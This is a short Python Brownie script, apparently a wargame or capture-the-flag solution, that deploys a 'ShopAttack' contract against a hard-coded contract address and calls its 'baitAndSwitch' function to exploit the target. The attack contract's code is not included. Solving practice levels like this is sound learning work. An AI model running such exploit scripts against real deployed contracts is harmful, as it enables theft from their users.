from scripts.helpful_scripts import get_account
from brownie import ShopAttack


def main():
    account = get_account()
    shop_attack = ShopAttack.deploy(
        "0xb66B9aB3E263b69eC2DB5591C648d00F06faF501", {"from": account}
    )

    tx = shop_attack.baitAndSwitch({"from": account})
    tx.wait(1)
